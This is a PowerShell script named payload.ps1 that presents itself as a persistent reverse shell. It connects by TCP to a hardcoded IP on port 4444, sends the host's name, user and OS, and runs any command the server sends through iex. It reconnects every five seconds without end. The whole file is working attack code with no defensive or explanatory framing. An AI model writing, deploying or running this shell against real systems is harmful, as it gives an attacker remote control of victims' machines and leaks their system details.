# payload.ps1 - Persistent reverse shell with connection tracking
$serverIP = "192.168.1.4"  # REPLACE WITH YOUR ARCH IP
$serverPort = 4444
$reconnectDelay = 5  # Seconds to wait before reconnecting

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    return "SYSINFO:$hostname|$username|$os"
}

function Connect-ToServer {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($serverIP, $serverPort)
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send system info
        $writer.WriteLine((Get-SystemInfo))
        $writer.Flush()
        
        # Main loop: wait for commands from server
        while ($true) {
            # Read command from server
            $command = $reader.ReadLine()
            if (-not $command) { break }  # Server closed connection
            
            if ($command -eq "exit") {
                break
            }
            
            # Execute command
            $result = iex $command 2>&1 | Out-String
            
            # Send output
            $writer.WriteLine($result)
            $writer.Flush()
        }
    }
    catch {
        # Connection failed, will reconnect
    }
    finally {
        $client.Close()
    }
}

# Main execution
while ($true) {
    try {
        Connect-ToServer
    }
    catch {
        # Ignore errors, will retry
    }
    
    # Wait before reconnecting
    Start-Sleep -Seconds $reconnectDelay
}
